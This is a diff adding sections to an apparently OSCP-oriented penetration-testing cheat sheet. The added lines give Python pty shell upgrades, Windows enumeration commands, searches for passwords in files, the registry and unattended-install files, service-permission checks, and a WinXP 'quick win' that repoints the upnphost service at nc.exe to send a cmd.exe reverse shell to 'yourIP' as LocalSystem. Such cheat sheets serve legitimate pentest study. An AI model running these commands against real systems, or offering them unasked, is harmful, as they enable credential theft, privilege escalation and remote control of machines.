@@ -159,12 +159,87 @@ p.waitFor()
 And on your side authorize the connection with `xhost +targetIp` and catch it with `Xnest :1`
 
 
-
-
 ## Interactive Shell Howto
 
+* Python (Linux)
+`python -c 'import pty; pty.spawn("/bin/bash")' `
 
-* Enterprise can run .jsp files too!
+* Python (Windows)
+`c:\python26\python.exe -c 'import pty; pty.spawn("c:\\windows\\system32\\cmd.exe")' `
+
+## Inside Windows
+
+* Get version
+`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
+
+* Get users
+`net users`
+
+* Get user info
+`net user <username>`
+
+
+* Check local connections and listening ports (compare with nmap scan to see if there are any hidden ports)
+`netstat -ano`
+
+* Firewall status
+`netsh firewall show state`
+`netsh firewall show config`
+
+* Scheduled tasks
+List - `schtasks /query /fo LIST /v`
+Create - `schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR "mycommands"`
+Run - `schtasks /Run /TN mytask`
+Delete - `schtasks /Delete /TN mytask`
+
+* Running tasks
+List - `tasklist /SVC`
+Kill - `taskkill /IM <exe name> /F`
+Kill - `taskkill /PID <pid> /F`
+
+* Services
+List - `net start`
+Long name to key name `sc getkeyname "long name"`
+Details - `sc qc <key name>`
+Config - `sc config <key name> `
+
+* Low hanging fruits to grab
+```
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+```
+
+* Installers are running as elevated?
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
+`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
+
+* Find interesting files
+`dir /s *pass* == *cred* == *vnc* == *.config*`
+`findstr /si password *.xml *.ini *.txt`
+
+* Find interesting registry entries
+`reg query HKLM /f password /t REG_SZ /s`
+`reg query HKCU /f password /t REG_SZ /s`
+
+* Permissions
+Check detail on service - `accesschk.exe /accepteula -ucqv <service name>`
+Find modifiable services - `accesschk.exe /accepteula -uwcqv "Authenticated Users" *`
+                           `accesschk.exe /accepteula -uwcqv "Users" *`
+Folder permissions - `accesschk.exe -dqv <path>`
+`cacls <path>`
+`icacls <path\file`
+                           
+* Qick win on WinXP SP0/1  
+`sc config upnphost binpath= "C:\nc.exe -nv yourIP 4444 -e C:\WINDOWS\System32\cmd.exe"`
+`sc config upnphost obj= ".\LocalSystem" password= ""`
+`sc config upnphost depend= ""`
+`net stop upnphost`
+`net start upnphost`
+
+
+
 ## References
 * [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md) - MUST read!
 * [FuzzySecurity](http://www.fuzzysecurity.com) - this is something you must bookmark... period. I found the [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html) especially useful.
